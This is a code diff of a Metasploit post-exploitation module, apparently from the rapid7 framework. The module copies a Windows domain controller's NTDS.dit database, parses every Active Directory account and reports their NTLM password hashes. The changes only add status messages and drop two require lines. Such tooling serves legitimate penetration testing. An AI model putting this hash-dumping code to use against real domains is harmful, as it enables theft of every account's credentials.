@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/auxiliary/report'
 require 'metasploit/framework/ntds/parser'
 
@@ -35,10 +33,13 @@ class MetasploitModule < Msf::Post
     if preconditions_met?
       ntds_file = copy_database_file
       unless ntds_file.nil?
+        file_stat = client.fs.file.stat(ntds_file)
+        print_status "NTDS File Size: #{file_stat.size.to_s} bytes"
         print_status "Repairing NTDS database after copy..."
         print_status repair_ntds(ntds_file)
         realm = sysinfo["Domain"]
         ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
+        print_status "Started up NTDS channel. Preparing to stream results..."
         ntds_parser.each_account do |ad_account|
           print_good ad_account.to_s
           report_hash(ad_account.ntlm_hash.downcase, ad_account.name, realm)
@@ -48,6 +49,7 @@ class MetasploitModule < Msf::Post
             report_hash(hash_string.downcase,ad_account.name, realm)
           end
         end
+        print_status "Deleting backup of NTDS.dit at #{ntds_file}"
         rm_f(ntds_file)
       end
     end
